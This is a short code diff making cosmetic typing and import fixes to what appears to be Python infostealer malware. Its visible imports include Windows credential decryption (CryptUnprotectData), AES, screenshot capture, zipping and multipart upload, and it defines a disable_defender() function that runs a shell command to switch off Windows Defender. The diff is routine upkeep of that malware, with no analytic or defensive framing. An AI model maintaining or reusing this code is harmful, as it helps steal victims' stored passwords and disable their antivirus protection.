@@ -10,7 +10,7 @@ import subprocess
 import sys
 import threading
 import time
-from ctypes import wintypes
+from typing import Union
 from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
@@ -18,7 +18,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 import psutil
 import requests
 from Cryptodome.Cipher import AES
-from PIL import Image, ImageGrab
+from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
@@ -147,7 +147,7 @@ def disable_defender():
     subprocess.run(cmd, shell=True, capture_output=True)
 
 
-def create_temp(_dir: str or os.PathLike = None):
+def create_temp(_dir: Union[str, os.PathLike] = None):
     if _dir is None:
         _dir = os.path.expanduser("~/tmp")
     if not os.path.exists(_dir):
